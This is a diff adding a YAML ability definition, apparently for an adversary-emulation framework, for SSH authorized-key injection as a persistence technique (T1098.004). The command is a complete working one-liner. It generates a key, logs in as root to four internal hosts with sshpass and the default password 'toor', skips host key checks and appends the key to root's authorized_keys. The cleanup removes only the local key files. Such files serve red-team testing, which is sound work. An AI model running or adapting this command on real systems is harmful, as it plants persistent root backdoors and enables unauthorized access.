@@ -1,0 +1,16 @@
+- id: pe01-ssh-key-inject
+  name: SSH Authorized Key Injection
+  description: Add attacker SSH public key to root authorized_keys on all servers
+  tactic: persistence
+  technique:
+    attack_id: T1098.004
+    name: Account Manipulation - SSH Authorized Keys
+  platforms:
+    linux:
+      sh:
+        command: |
+          ssh-keygen -t rsa -b 2048 -f /tmp/phantom_key -N '' -q 2>/dev/null; PUB=$(cat /tmp/phantom_key.pub); for h in 10.0.20.10 10.0.20.21 10.0.20.30 10.0.20.40; do sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@$h "mkdir -p /root/.ssh; echo '$PUB' >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys" 2>/dev/null && echo "[+] Key injected: $h"; done
+        cleanup: |
+          rm -f /tmp/phantom_key /tmp/phantom_key.pub
+  singleton: false
+  repeatable: false
